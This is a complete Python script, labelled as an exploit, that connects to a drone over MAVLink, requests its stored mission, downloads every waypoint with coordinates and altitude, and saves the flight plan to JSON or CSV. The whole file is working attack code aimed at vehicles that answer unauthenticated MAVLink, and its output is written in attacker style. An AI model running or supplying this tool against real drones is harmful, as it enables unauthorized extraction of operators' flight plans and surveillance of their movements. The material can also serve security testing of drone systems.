#!/usr/bin/env python3
"""
Mission Extraction Exploit Script
Downloads mission waypoints from drone via MAVLink
"""

import sys
import json
import time
from pathlib import Path
from pymavlink import mavutil

def request_mission_list(connection):
    """
    Request mission waypoint list
    
    Args:
        connection: MAVLink connection object
    
    Returns:
        Mission count or None
    """
    print("[*] Requesting mission list...")
    connection.mav.mission_request_list_send(
        connection.target_system,
        connection.target_component
    )
    
    # Wait for MISSION_COUNT response
    msg = connection.recv_match(type='MISSION_COUNT', blocking=True, timeout=5)
    if msg:
        print(f"[+] Mission contains {msg.count} waypoint(s)")
        return msg.count
    else:
        print("[-] No mission count received")
        return None

def download_mission(connection, count):
    """
    Download all mission waypoints
    
    Args:
        connection: MAVLink connection object
        count: Number of waypoints
    
    Returns:
        List of waypoint dictionaries
    """
    waypoints = []
    
    for seq in range(count):
        # Request waypoint
        connection.mav.mission_request_int_send(
            connection.target_system,
            connection.target_component,
            seq
        )
        
        # Wait for MISSION_ITEM_INT response
        msg = connection.recv_match(type='MISSION_ITEM_INT', blocking=True, timeout=5)
        if msg:
            waypoint = {
                'sequence': msg.seq,
                'frame': msg.frame,
                'command': msg.command,
                'current': msg.current,
                'autocontinue': msg.autocontinue,
                'param1': msg.param1,
                'param2': msg.param2,
                'param3': msg.param3,
                'param4': msg.param4,
                'x': msg.x / 1e7,  # Convert to degrees
                'y': msg.y / 1e7,  # Convert to degrees
                'z': msg.z,        # Altitude in meters
                'mission_type': msg.mission_type
            }
            waypoints.append(waypoint)
            print(f"[+] Downloaded waypoint {seq}: lat={waypoint['x']:.6f}, lon={waypoint['y']:.6f}, alt={waypoint['z']}m")
        else:
            print(f"[-] Timeout waiting for waypoint {seq}")
    
    return waypoints

def save_mission(waypoints, output_file, format='json'):
    """
    Save mission to file
    
    Args:
        waypoints: List of waypoint dictionaries
        output_file: Output file path
        format: Output format ('json' or 'csv')
    """
    output_path = Path(output_file)
    output_path.parent.mkdir(parents=True, exist_ok=True)
    
    if format == 'json':
        with open(output_path, 'w') as f:
            json.dump({
                'waypoint_count': len(waypoints),
                'waypoints': waypoints
            }, f, indent=2)
        print(f"[+] Mission saved to {output_path} (JSON)")
    
    elif format == 'csv':
        import csv
        with open(output_path, 'w', newline='') as f:
            writer = csv.DictWriter(f, fieldnames=[
                'sequence', 'frame', 'command', 'current', 'autocontinue',
                'param1', 'param2', 'param3', 'param4', 'x', 'y', 'z', 'mission_type'
            ])
            writer.writeheader()
            writer.writerows(waypoints)
        print(f"[+] Mission saved to {output_path} (CSV)")

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 mission_extraction.py <connection> [output_file] [format]")
        print("Example: python3 mission_extraction.py udp:127.0.0.1:14550")
        print("Example: python3 mission_extraction.py udp:127.0.0.1:14550 mission.json json")
        sys.exit(1)
    
    connection_string = sys.argv[1]
    output_file = sys.argv[2] if len(sys.argv) > 2 else "extracted_mission.json"
    format_type = sys.argv[3] if len(sys.argv) > 3 else "json"
    
    if format_type not in ['json', 'csv']:
        print("[-] Format must be 'json' or 'csv'")
        sys.exit(1)
    
    print(f"[*] Connecting to {connection_string}...")
    try:
        connection = mavutil.mavlink_connection(connection_string)
        connection.wait_heartbeat(timeout=5)
        print("[+] Connected to vehicle")
    except Exception as e:
        print(f"[-] Failed to connect: {e}")
        sys.exit(1)
    
    # Request mission count
    count = request_mission_list(connection)
    if count is None or count == 0:
        print("[-] No mission found or failed to get mission count")
        sys.exit(1)
    
    # Download mission
    waypoints = download_mission(connection, count)
    
    if waypoints:
        # Save mission
        if format_type == 'csv' and not output_file.endswith('.csv'):
            output_file = output_file.replace('.json', '.csv')
        save_mission(waypoints, output_file, format_type)
        
        print(f"\n[+] Mission extraction complete: {len(waypoints)} waypoint(s) extracted")
    else:
        print("[-] Failed to download mission")
        sys.exit(1)

if __name__ == "__main__":
    main()
